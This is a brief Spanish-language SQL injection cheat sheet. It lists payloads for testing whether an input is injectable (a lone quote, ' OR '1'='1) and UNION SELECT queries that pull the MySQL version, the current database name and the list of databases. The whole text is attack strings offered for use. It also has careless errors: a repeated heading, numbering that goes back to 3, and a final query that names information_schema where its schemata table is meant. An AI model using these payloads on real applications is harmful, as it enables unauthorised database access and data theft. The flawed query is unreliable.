1. Para identificar si una entrada es vulnerable,colocamos un comilla

```
'
```

2. Para identificar si una entrada es vulnerable,colocamos un comilla

```
' OR '1'='1
```

3. Obtener la version de la base de datos para saber si es de mysql

```
' UNION SELECT @@version, NULL; --

```

4. Obtener el nombre de la base de datos actual

```
' UNION SELECT database(), NULL; --
```

3.  Listar todas las bases de datos

```
' UNION SELECT schema_name, NULL FROM information_schema; --

```
